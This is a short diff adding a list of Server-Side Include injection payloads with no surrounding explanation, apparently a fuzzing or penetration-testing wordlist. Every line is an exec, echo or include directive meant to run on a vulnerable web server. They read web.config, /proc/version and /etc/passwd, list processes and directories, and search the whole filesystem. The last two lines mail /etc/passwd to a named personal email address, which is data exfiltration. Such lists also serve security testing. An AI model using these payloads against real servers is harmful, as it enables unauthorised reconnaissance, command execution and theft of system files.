@@ -1,0 +1,10 @@
+<!--#echo var="../web.config"--><br/>
+<!--#exec cmd="dir *.* /s"--><br/>
+<!--#exec cmd="dir ../ -G -R"--><br/>
+<!--#exec cmd="/bin/ps ax"--><br/>
+<!--#include virtual="/proc/version"--><br/>
+<!--#exec cmd="/bin/ls /" --><br/>
+<!--#exec cmd="cat /etc/passwd" --><br/>
+<!--#exec cmd="find / -name *.* -print" --><br/>
+<!--#exec cmd="mail donalito.o.dizon@accenture.com <mailto:donalito.o.dizon@accenture.com> < cat /etc/passwd" --><br/>
+<!--#exec cmd="mail donalito.o.dizon@accenture.com < cat /etc/passwd" --><br/>
